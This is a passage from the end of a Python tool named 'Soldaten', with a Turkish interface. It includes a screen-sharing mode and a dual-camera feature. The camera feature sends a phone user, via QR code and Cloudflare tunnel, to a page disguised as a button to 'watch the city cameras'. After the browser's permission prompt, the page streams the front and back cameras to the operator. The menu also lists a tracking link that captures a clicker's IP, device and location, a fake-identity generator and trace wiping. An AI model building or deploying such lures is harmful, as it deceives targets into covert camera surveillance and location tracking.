                self.send_header("Content-Type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Content-Length", str(len(resp)))
                self.end_headers()
                self.wfile.write(resp)
            else:
                self.send_response(404); self.end_headers()

        def do_OPTIONS(self):
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type")
            self.end_headers()

        def _html(self, body):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-cache")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a): pass

    class DSrv(_ss_d.ThreadingMixIn, HTTPServer):
        daemon_threads = True

    sunucu = DSrv(("0.0.0.0", PORT_D), DHandler)
    _th_d.Thread(target=sunucu.serve_forever, daemon=True).start()

    # ── Cloudflare tüneli ────────────────────────
    # Önceki cloudflared process'i temizle
    subprocess.run(["taskkill", "/F", "/IM", "cloudflared.exe"],
                   capture_output=True)
    CF_EXE = os.path.join(os.path.expanduser("~"), ".soldaten", "cloudflared.exe")
    os.makedirs(os.path.dirname(CF_EXE), exist_ok=True)

    if not os.path.isfile(CF_EXE):
        spin("Cloudflared indiriliyor (tek seferlik ~30MB)", 3)
        try:
            import urllib.request as _ur_d
            _ur_d.urlretrieve(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
                CF_EXE
            )
            info("Cloudflared indirildi.")
        except Exception as e:
            error(f"Cloudflared indirilemedi: {e}")
            sunucu.shutdown(); pause(); return

    spin("Cloudflare tuneli aciliyor...", 2)
    import re as _re_d
    cf_proc = subprocess.Popen(
        [CF_EXE, "tunnel", "--url", f"http://localhost:{PORT_D}", "--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    public_url = None
    deadline   = time.time() + 25
    while time.time() < deadline:
        line = cf_proc.stderr.readline().decode("utf-8", errors="replace")
        m    = _re_d.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if m:
            public_url = m.group(0); break

    if not public_url:
        cf_proc.terminate(); sunucu.shutdown()
        error("Cloudflare URL alinamadi."); pause(); return

    paylas_url = public_url + "/paylas"
    izle_url   = public_url + "/izle"

    # ── QR bas ───────────────────────────────────
    def qr_bas_d(url):
        qr = _qr_d.QRCode(border=2)
        qr.add_data(url)
        qr.make(fit=True)
        try:
            "██".encode(sys.stdout.encoding or "utf-8")
            d2, b2 = "██", "  "
        except:
            d2, b2 = "##", "  "
        for row in qr.get_matrix():
            sys.stdout.write("  "+GREEN+"".join(d2 if c else b2 for c in row)+R+"\n")
        sys.stdout.flush()

    import webbrowser as _wb_d
    _opened = [False]

    if pc_paylasiyor:
        # PC ekranı paylaşır → QR telefona gider (izleyici)
        clear()
        banner("EKRAN PAYLASIMI", "PC Masaustu → Telefondan Izle")
        print(f"  {BOLD}{GREEN}1.{R}  {WHITE}Asagidaki linki PC tarayicinda ac:{R}")
        print(f"     {YELLOW}{paylas_url}{R}")
        print(f"  {BOLD}{GREEN}2.{R}  {WHITE}▶ emojisine tikla, ekranini sec, paylas{R}")
        print(f"  {BOLD}{GREEN}3.{R}  {WHITE}Telefonda QR'i tara → canli izle:{R}\n")
        qr_bas_d(izle_url)
        print(f"  {DGREEN}  Telefon izleme linki: {YELLOW}{izle_url}{R}\n")
        print(f"  {GRAY}Cikmak icin CTRL+C{R}\n")
        thick()
        # PC tarayıcısını otomatik aç — hem paylaş hem izle aynı anda
        time.sleep(0.5)
        _wb_d.open(paylas_url)
        time.sleep(1.5)
        _wb_d.open(izle_url)  # izleme sayfası da açılsın
    else:
        # Telefon ekranı paylaşır → PC izler
        clear()
        banner("EKRAN PAYLASIMI", "Telefon Ekrani → PC'den Izle")
        print(f"  {BOLD}{GREEN}1.{R}  {WHITE}Telefonda QR'i tara:{R}\n")
        qr_bas_d(paylas_url)
        print(f"  {YELLOW}{paylas_url}{R}")
        print(f"\n  {BOLD}{GREEN}2.{R}  {WHITE}▶ emojisine dokun, ekrani sec, paylas{R}")
        print(f"  {BOLD}{GREEN}3.{R}  {WHITE}PC'de izleme sayfasi simdi aciliyor{R}")
        print(f"\n  {GRAY}Cikmak icin CTRL+C{R}\n")
        thick()
        # PC'de izle sayfasını hemen aç — telefon bağlanınca görüntü gelir
        time.sleep(0.5)
        _wb_d.open(izle_url)
        _opened[0] = True  # tekrar açmasın

    # Bekleme döngüsü — frame gelince PC'de izle sayfası aç (telefon modu)
    try:
        while True:
            time.sleep(0.3)
            with _lock_d:
                has = _frame_d["ts"] > 0
            if has and not _opened[0]:
                _opened[0] = True
                if tel_paylasiyor:
                    sys.stdout.write(f"\r  {GREEN}[+] Telefon baglandi! Izleme sayfasi aciliyor...{' ':10}{R}\n")
                    sys.stdout.flush()
                    _wb_d.open(izle_url)
                else:
                    sys.stdout.write(f"\r  {GREEN}[+] Paylasim basladi! Telefonda canli izle.{' ':10}{R}\n")
                    sys.stdout.flush()
    except KeyboardInterrupt:
        cf_proc.terminate()
        sunucu.shutdown()
        clear()
        success("Ekran paylasimi kapatildi.")
        pause()




# ════════════════════════════════════════════════
#  31. CIFT KAMERA IZLE (On + Arka)
# ════════════════════════════════════════════════
def menu_cift_kamera():
    banner("CIFT KAMERA IZLE", "On + Arka kamera ayni anda — Cloudflare")
    print(f"  {DGREEN}Telefon QR'i tarar, kamerayi acar, PC'den izlersin.{R}\n")

    try:
        import qrcode as _qr_ck
    except ImportError:
        spin("qrcode yukleniyor", 2)
        subprocess.run([sys.executable, "-m", "pip", "install", "qrcode", "--quiet"],
                       stderr=subprocess.DEVNULL)
        import qrcode as _qr_ck

    import threading    as _th_ck
    import json         as _js_ck
    import base64       as _b6_ck
    import socketserver as _ss_ck
    from http.server import HTTPServer, BaseHTTPRequestHandler

    PORT_CK = 7474
    for _p in range(7474, 7520):
        try:
            import socket as _sk_ck
            _t = _sk_ck.socket(_sk_ck.AF_INET, _sk_ck.SOCK_STREAM)
            _t.bind(("", _p)); _t.close()
            PORT_CK = _p; break
        except OSError:
            continue

    _lock_ck = _th_ck.Lock()
    _frames  = {
        "on":   {"jpg": b"", "ts": 0},
        "arka": {"jpg": b"", "ts": 0}
    }

    TELEFON_CK = (
        "<!DOCTYPE html><html><head>"
        "<meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1.0,user-scalable=no'>"
        "<title>.</title>"
        "<style>"
        "*{margin:0;padding:0;box-sizing:border-box}"
        "html,body{width:100%;height:100%;background:#0d1117;overflow:hidden;"
        "display:flex;flex-direction:column;align-items:center;justify-content:center}"
        "#btn{display:flex;flex-direction:column;align-items:center;gap:14px;"
        "cursor:pointer;-webkit-tap-highlight-color:transparent;padding:28px}"
        "#ic{font-size:92px;animation:b 1.4s ease-in-out infinite;pointer-events:none}"
        "@keyframes b{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}"
        "#lbl{color:#fff;font-family:Arial,sans-serif;font-size:17px;"
        "font-weight:bold;letter-spacing:1px;pointer-events:none}"
        "#st{color:#3fb950;font-family:Arial,sans-serif;font-size:12px;"
        "text-align:center;padding:0 20px;margin-top:6px;min-height:18px}"
        "#vs{display:none;width:100%;padding:8px;gap:8px;flex-direction:row}"
        ".vw{flex:1;border-radius:6px;overflow:hidden;background:#000;position:relative}"
        ".vw span{position:absolute;top:4px;left:6px;color:#3fb950;"
        "font-size:10px;font-family:Arial,sans-serif;z-index:2;font-weight:bold}"
        "video{width:100%;height:130px;object-fit:cover;display:block}"
        "canvas{display:none}"
        "</style></head><body>"
        "<div id='btn' onclick='baslat()'>"
        "<span id='ic'>&#128070;</span>"
        "<span id='lbl'>Mobese'yi Izle</span>"
        "</div>"
        "<div id='st'></div>"
        "<div id='vs'>"
        "<div class='vw'><span>ON</span>"
        "<video id='von' autoplay muted playsinline></video></div>"
        "<div class='vw'><span>ARKA</span>"
        "<video id='varka' autoplay muted playsinline></video></div>"
        "</div>"
        "<canvas id='con'></canvas>"
        "<canvas id='carka'></canvas>"
        "<script>"
        "var von=document.getElementById('von');"
        "var varka=document.getElementById('varka');"
        "var con=document.getElementById('con');"
        "var carka=document.getElementById('carka');"
        "var xon=con.getContext('2d'),xarka=carka.getContext('2d');"
        "var go=false,busy=false;"
        "function stm(m){document.getElementById('st').textContent=m;}"
        "function sl(ms){return new Promise(function(r){setTimeout(r,ms);});}"
        "async function baslat(){"
        "if(busy)return;busy=true;"
        "document.getElementById('btn').style.display='none';"
        "stm('Kamera izni isteniyor...');"
        "try{"
        "var son=await navigator.mediaDevices.getUserMedia("
        "{video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false});"
        "von.srcObject=son;"
        "await new Promise(function(r){von.onloadedmetadata=r;});"
        "con.width=von.videoWidth||640;con.height=von.videoHeight||480;"
        "stm('On kamera acildi...');"
        "}catch(e){stm('On kamera: '+e.message);}"
        "try{"
        "var sarka=await navigator.mediaDevices.getUserMedia("
        "{video:{facingMode:{exact:'environment'},width:{ideal:640},height:{ideal:480}},audio:false});"
        "varka.srcObject=sarka;"
        "await new Promise(function(r){varka.onloadedmetadata=r;});"
        "carka.width=varka.videoWidth||640;carka.height=varka.videoHeight||480;"
        "stm('Yayinlaniyor...');"
        "}catch(e){"
        "try{"
        "var sarka2=await navigator.mediaDevices.getUserMedia("
        "{video:{facingMode:'environment',width:{ideal:640},height:{ideal:480}},audio:false});"
        "varka.srcObject=sarka2;"
        "await new Promise(function(r){varka.onloadedmetadata=r;});"
        "carka.width=varka.videoWidth||640;carka.height=varka.videoHeight||480;"
        "stm('Yayinlaniyor...');"
        "}catch(e2){stm('Arka: '+e2.message);}}"
        "document.getElementById('vs').style.display='flex';"
        "await sl(400);go=true;gonder();}"
        "async function gonder(){"
        "while(go){"
        "if(von.readyState>=2&&von.videoWidth>0){"
        "xon.drawImage(von,0,0,con.width,con.height);"
        "var b1=con.toDataURL('image/jpeg',0.7).split(',')[1];"
        "fetch('/frame',{method:'POST',headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({f:b1,cam:'on'})}).catch(function(){});}"
        "await sl(80);"
        "if(varka.readyState>=2&&varka.videoWidth>0){"
        "xarka.drawImage(varka,0,0,carka.width,carka.height);"
        "var b2=carka.toDataURL('image/jpeg',0.7).split(',')[1];"
        "fetch('/frame',{method:'POST',headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({f:b2,cam:'arka'})}).catch(function(){});}"
        "await sl(80);}}"
        "</script></body></html>"
    ).encode("utf-8")

    def izle_sayfasi(cam, baslik):
        return (
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width,initial-scale=1.0'>"
            "<title>" + baslik + "</title>"
            "<style>"
            "*{margin:0;padding:0;box-sizing:border-box}"
            "body{background:#000;display:flex;flex-direction:column;height:100vh}"
            "#bar{background:#0d1117;padding:7px 12px;display:flex;align-items:center;"
            "gap:10px;border-bottom:1px solid #21262d;flex-shrink:0}"
            "#bar h2{color:#58a6ff;font-size:.85em;flex:1}"
            "#fps{color:#8b949e;font-size:.7em}"
            ".btn{background:#21262d;color:#c9d1d9;border:none;border-radius:4px;"
            "padding:5px 11px;font-size:.72em;cursor:pointer}"
            ".btn:hover{background:#30363d}"
            "#wrap{flex:1;display:flex;align-items:center;justify-content:center;background:#000}"
            "#img{max-width:100%;max-height:100%;object-fit:contain}"
            "#wait{position:fixed;inset:0;display:flex;flex-direction:column;"
            "align-items:center;justify-content:center;gap:12px;background:#000;z-index:5}"
            ".sp{width:36px;height:36px;border:4px solid #21262d;"
            "border-top:4px solid #58a6ff;border-radius:50%;animation:sp .8s linear infinite}"
            "@keyframes sp{to{transform:rotate(360deg)}}"
            "#sb{position:fixed;bottom:12px;right:12px;background:#1f6feb;color:#fff;"
            "border:none;border-radius:5px;padding:8px 14px;font-size:.75em;"
            "font-weight:bold;cursor:pointer;display:none}"
            "</style></head><body>"
            "<div id='bar'><h2>&#128247; " + baslik + "</h2>"
            "<span id='fps'></span>"
            "<button class='btn' onclick='snap()'>&#128248; SS</button>"
            "<button class='btn' onclick='location.reload()'>&#8635;</button></div>"
            "<div id='wrap'><img id='img' style='display:none' alt=''></div>"
            "<div id='wait'><div class='sp'></div>"
            "<p style='color:#8b949e;font-size:.8em'>Telefon bekleniyor...</p></div>"
            "<button id='sb' onclick='snap()'>&#128248; SS Al</button>"
            "<script>"
            "var last=0,fc=0,ft=Date.now();"
            "function snap(){var i=document.getElementById('img');if(!i.src)return;"
            "var cv=document.createElement('canvas');var im=new Image();im.src=i.src;"
            "im.onload=function(){cv.width=im.width;cv.height=im.height;"
            "cv.getContext('2d').drawImage(im,0,0);"
            "var a=document.createElement('a');a.href=cv.toDataURL('image/png');"
            "a.download='" + cam + "_'+Date.now()+'.png';a.click();}}"
            "async function loop(){while(true){"
            "try{var r=await fetch('/frame?cam=" + cam + "').then(function(x){return x.json();}).catch(function(){return null;});"
            "if(r&&r.ts&&r.ts!==last){last=r.ts;"
            "var img=document.getElementById('img');"
            "img.src='data:image/jpeg;base64,'+r.f;"
            "img.style.display='block';"
            "document.getElementById('wait').style.display='none';"
            "document.getElementById('sb').style.display='block';"
            "fc++;var now=Date.now();"
            "if(now-ft>=1000){document.getElementById('fps').textContent=fc+' fps';fc=0;ft=now;}"
            "}}catch(e){}"
            "await new Promise(function(r){setTimeout(r,50);})}}"
            "loop();"
            "</script></body></html>"
        ).encode("utf-8")

    ON_IZLE_HTML   = izle_sayfasi("on",   "On Kamera")
    ARKA_IZLE_HTML = izle_sayfasi("arka", "Arka Kamera")

    class CKHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            path = self.path.split("?")[0]
            qs   = self.path[self.path.find("?")+1:] if "?" in self.path else ""
            if path == "/":
                self._html(TELEFON_CK)
            elif path == "/on":
                self._html(ON_IZLE_HTML)
            elif path == "/arka":
                self._html(ARKA_IZLE_HTML)
            elif path == "/frame":
                cam = "on"
                for p in qs.split("&"):
                    if p.startswith("cam="): cam = p[4:]; break
                cam = cam if cam in ("on","arka") else "on"
                with _lock_ck:
                    ts = _frames[cam]["ts"]
                    f  = _frames[cam]["jpg"]
                b64  = _b6_ck.b64encode(f).decode("ascii") if f else ""
                body = _js_ck.dumps({"ts":ts,"f":b64}).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type","application/json")
                self.send_header("Access-Control-Allow-Origin","*")
                self.send_header("Cache-Control","no-store")
                self.send_header("Content-Length",str(len(body)))
                self.end_headers(); self.wfile.write(body)
            else:
                self.send_response(204); self.end_headers()

        def do_POST(self):
            if self.path.split("?")[0] != "/frame":
                self.send_response(404); self.end_headers(); return
            try:
                cl  = self.headers.get("Content-Length")
                raw = self.rfile.read(int(cl)) if cl else b""
                d   = _js_ck.loads(raw.decode("utf-8"))
                b64 = d.get("f",""); cam = d.get("cam","on")
                cam = cam if cam in ("on","arka") else "on"
                if b64:
                    b64 += "=" * (-len(b64) % 4)
                    jpg = _b6_ck.b64decode(b64)
                    with _lock_ck:
                        _frames[cam]["jpg"] = jpg
                        _frames[cam]["ts"]  = int(time.time()*1000)
            except: pass
            resp = b'{"ok":1}'
            self.send_response(200)
            self.send_header("Content-Type","application/json")
            self.send_header("Access-Control-Allow-Origin","*")
            self.send_header("Content-Length",str(len(resp)))
            self.end_headers(); self.wfile.write(resp)

        def do_OPTIONS(self):
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin","*")
            self.send_header("Access-Control-Allow-Methods","GET,POST,OPTIONS")
            self.send_header("Access-Control-Allow-Headers","Content-Type")
            self.end_headers()

        def _html(self, body):
            self.send_response(200)
            self.send_header("Content-Type","text/html; charset=utf-8")
            self.send_header("Cache-Control","no-cache")
            self.send_header("Content-Length",str(len(body)))
            self.end_headers(); self.wfile.write(body)

        def log_message(self, *a): pass

    class CKSrv(_ss_ck.ThreadingMixIn, HTTPServer):
        daemon_threads = True

    sunucu = CKSrv(("0.0.0.0", PORT_CK), CKHandler)
    _th_ck.Thread(target=sunucu.serve_forever, daemon=True).start()

    def qr_bas_ck(url):
        qr = _qr_ck.QRCode(border=2); qr.add_data(url); qr.make(fit=True)
        try: "██".encode(sys.stdout.encoding or "utf-8"); d2,b2="██","  "
        except: d2,b2="##","  "
        for row in qr.get_matrix():
            sys.stdout.write("  "+GREEN+"".join(d2 if c else b2 for c in row)+R+"\n")
        sys.stdout.flush()

    subprocess.run(["taskkill","/F","/IM","cloudflared.exe"], capture_output=True)
    # Önceki oturumdan kalan portu temizle
    try:
        import subprocess as _sp_ck
        result = _sp_ck.run(
            ["netstat", "-ano"],
            capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            if f":{PORT_CK}" in line and "LISTENING" in line:
                parts = line.split()
                pid = parts[-1]
                if pid.isdigit() and int(pid) != os.getpid():
                    _sp_ck.run(["taskkill", "/F", "/PID", pid], capture_output=True)
    except: pass
    CF_EXE = os.path.join(os.path.expanduser("~"), ".soldaten", "cloudflared.exe")
    os.makedirs(os.path.dirname(CF_EXE), exist_ok=True)

    if not os.path.isfile(CF_EXE):
        spin("Cloudflared indiriliyor (tek seferlik ~30MB)", 3)
        try:
            import urllib.request as _ur_ck
            _ur_ck.urlretrieve(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
                CF_EXE)
            info("Cloudflared indirildi.")
        except Exception as e:
            error(f"Cloudflared indirilemedi: {e}")
            sunucu.shutdown(); pause(); return

    spin("Cloudflare tuneli aciliyor...", 2)
    import re as _re_ck
    cf_proc = subprocess.Popen(
        [CF_EXE, "tunnel", "--url", f"http://localhost:{PORT_CK}", "--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    public_url = None
    deadline = time.time() + 25
    while time.time() < deadline:
        line = cf_proc.stderr.readline().decode("utf-8", errors="replace")
        m    = _re_ck.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if m: public_url = m.group(0); break

    if not public_url:
        cf_proc.terminate(); sunucu.shutdown()
        error("Cloudflare URL alinamadi."); pause(); return

    on_url   = public_url + "/on"
    arka_url = public_url + "/arka"

    import webbrowser as _wb_ck
    clear()
    banner("CIFT KAMERA IZLE", "On + Arka Kamera")
    print(f"  {BOLD}{GREEN}1.{R}  {WHITE}Telefonda QR'i tara:{R}\n")
    qr_bas_ck(public_url)
    print(f"\n  {YELLOW}{public_url}{R}")
    print(f"\n  {BOLD}{GREEN}2.{R}  {WHITE}👆 emojisine dokun → kameralar acilir{R}")
    print(f"  {BOLD}{GREEN}3.{R}  {WHITE}PC'de iki pencere otomatik acilir{R}\n")
    print(f"  {DGREEN}  On  : {CYAN}{on_url}{R}")
    print(f"  {DGREEN}  Arka: {CYAN}{arka_url}{R}\n")
    print(f"  {GRAY}Cikmak icin CTRL+C{R}\n")
    thick()

    time.sleep(0.5); _wb_ck.open(on_url)
    time.sleep(0.8); _wb_ck.open(arka_url)

    try:
        while True:
            time.sleep(0.5)
            with _lock_ck:
                on_ts   = _frames["on"]["ts"]
                arka_ts = _frames["arka"]["ts"]
            parts = []
            if on_ts > 0:   parts.append(f"{GREEN}On✓{R}")
            if arka_ts > 0: parts.append(f"{GREEN}Arka✓{R}")
            if parts:
                sys.stdout.write(f"\r  {' | '.join(parts)} baglandi{' ':20}")
                sys.stdout.flush()
    except KeyboardInterrupt:
        cf_proc.terminate(); sunucu.shutdown()
        clear(); success("Cift kamera izleme kapatildi."); pause()


# ════════════════════════════════════════════════
MENU=[
    ("1",  "Mevcut Durum",            "IP · Konum · Sistem",              GREEN, menu_durum),
    ("2",  "IP Degistir",             "Tor / Proxy",                      GREEN, menu_ip),
    ("3",  "Bilgisayar Adi",          "Hostname degistir",                GREEN, menu_hostname),
    ("4",  "MAC Adresi",              "Ag kimligini degistir",            GREEN, menu_mac),
    ("5",  "DNS Degistir",            "Cloudflare / Google / Quad9",      GREEN, menu_dns),
    ("6",  "Aktif Baglantilar",       "Kim nereye bagliyor?",             GREEN, menu_connections),
    ("7",  "Temp & Iz Temizle",       "Gecici dosyalar · Prefetch",       GREEN, menu_clean_temp),
    ("8",  "Tarayici Gecmisi",        "Chrome · Edge · Firefox · Brave",  GREEN, menu_clean_browser),
    ("9",  "Pano & Recent Temizle",   "Kopyaladiklarini unut",            GREEN, menu_clipboard),
    ("10", "Calisanlar",              "Arka planda ne var?",              GREEN, menu_processes),
    ("11", "Startup Programlari",     "Acilista ne basliyor?",            GREEN, menu_startup),
    ("12", "Dosya Sifrele/Coz",       "AES ile guclu sifreleme",          GREEN, menu_encrypt),
    ("13", "Guvenli Sil",             "Dosyayi kurtarilmaz yap",          GREEN, menu_secure_delete),
    ("14", "Sifre Uretici",           "100+ rastgele guclu sifre",        GREEN, menu_password),
    ("15", "Sahte Kimlik Uretici",    "1000 rastgele kisilik",            GREEN, menu_sahte_kimlik),
    ("16", "IP Sorgula",              "IP hakkinda her seyi oren",        GREEN, menu_ip_sorgu),
    ("17", "USB Gecmisi Temizle",     "Takilan USB kayitlarini sil",      GREEN, menu_usb_temizle),
    ("18", "Saka BAT Uretici",        "Masaustune saka dosyasi olustur",  GREEN, menu_saka_bat),
    ("19", "Matrix Ekrani",           "Terminalde Matrix yagmuru",         GREEN, menu_matrix),
    ("20", "Sahte Hata Mesaji",       "Dramatik sistem hatasi sahnesi",    GREEN, menu_sahte_hata),
    ("21", "Klavye Kitleme BAT",      "Secili tuslari devre disi birak",   GREEN, menu_klavye_kilitle),
    ("22", "IPv6 Yonetimi",           "IPv6 kapat · aktif et · durum",     GREEN, menu_ipv6),
    ("23", "Uygulama Gizlilik",       "Kamera · Mikrofon · Konum kapat",   GREEN, menu_gizlilik),
    ("24", "Mobil QR Uretici",        "Telefona QR ile link/WiFi gonder",  GREEN, menu_mobil_qr),
    ("25", "QR Cihaz Tespiti",        "Telefonu tara, cihaz bilgisi al",   GREEN, menu_qr_cihaz),
    ("26", "Zararli Yazilim Tarayici","Virus · Trojan · Supheli dosya",   GREEN, menu_malware_scan),
    ("27", "QR Dosya Paylasimi",      "Dosyayi QR ile herkese gonder",     GREEN, menu_qr_dosya),
    ("28", "Takip Linki / Pixel",     "Tiklayana IP cihaz konum dusunsun", GREEN, menu_takip_linki),
    ("29", "Uzak Ekran Goruntule",    "QR tara, telefonun ekranini izle",  GREEN, menu_uzak_ekran),
    ("30", "Canli Telefon Izle",      "QR tara, kamerayi canli izle",      GREEN, menu_canli_izle),
    ("31", "Cift Kamera Izle",        "On + Arka kamera ayni anda izle",   GREEN, menu_cift_kamera),
    ("0",  "Cikis",                   "",                                 RED,   None),
]

def draw_menu():
    banner()
    print()
    for key,title,sub,color,_ in MENU:
        if key=="0":
            print(f"  {RED}[{key}]{R}  {RED}{title}{R}")
        else:
            sub_str=f"  {DGREEN}{sub}{R}" if sub else ""
            k_w=4 if len(key)<3 else 5
            print(f"  {GREEN}[{key}]{' '*(k_w-len(key))}{R}{BOLD}{GREEN}{title:<26}{R}{sub_str}")
    print(); thick()
    print(f"\n  {GREEN}Secim:{R}  ",end="")

def main():
    animated_banner()
    time.sleep(0.3)
    typewrite("  Hosgeldin. Sistem yukleniyor...",delay=0.025,color=GRAY)
    time.sleep(0.2)
    while True:
        draw_menu()
        try: choice=input().strip()
        except KeyboardInterrupt:
            clear(); typewrite("\n  Soldaten kapatildi. Guvenli kalin.",color=CYAN); print(); sys.exit(0)
        action=next((fn for k,_,_,_,fn in MENU if k==choice),"INVALID")
        if choice=="0":
            clear(); typewrite("\n  Soldaten kapatildi. Guvenli kalin.",color=CYAN); print(); sys.exit(0)
        elif action=="INVALID":
            warn("Gecersiz secim."); time.sleep(0.8)
        else:
            action()

if __name__=="__main__":
    main()
